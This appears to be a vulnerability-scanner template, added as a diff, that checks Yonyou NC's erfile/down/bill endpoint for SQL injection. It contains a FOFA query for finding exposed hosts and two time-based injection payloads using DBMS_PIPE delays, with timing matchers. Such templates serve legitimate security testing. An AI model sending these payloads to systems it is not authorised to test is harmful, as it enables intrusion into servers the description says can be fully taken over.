@@ -1,0 +1,39 @@
+id: yongyouNC-down_bill-sql
+
+info:
+  name: "用友 NC 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="1085941792" && body="/logo/images/logo.gif"
+      用友NC系统//portal/pt/erfile/down/bill接口的id参数存在SQL注入漏洞。攻击者可利用该漏洞通过调用数据库扩展存储过程（如xp_cmdshell）执行任意系统命令，实现对目标服务器的完全控制。经技术评估，该漏洞攻击复杂度低且可直接获取系统权限，建议受影响系统立即部署补丁或实施访问控制策略。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247484615&idx=1&sn=d2f67d2b361b8382d7ee7a8a4e7badf7&chksm=c267b1f4f51038e2df8b2ec00c7a937e2f1aec08b08c9bbcb82d724f94adad9ff29986ddbb24&token=1619136955&lang=zh_CN#rd
+  tags: 用友
+
+http:
+- raw:
+  - |
+    GET /portal/pt/erfile/down/bill?pageId=login&id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),3)-- HTTP/1.1 
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+  - |
+    GET /portal/pt/erfile/down/bill?pageId=login&id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),6)-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=3 && duration_1<=4'
+    - 'duration_2>=6 && duration_2<=7'
+    condition: and
+  - type: status
+    status:
+    - 500
+
+
+
+
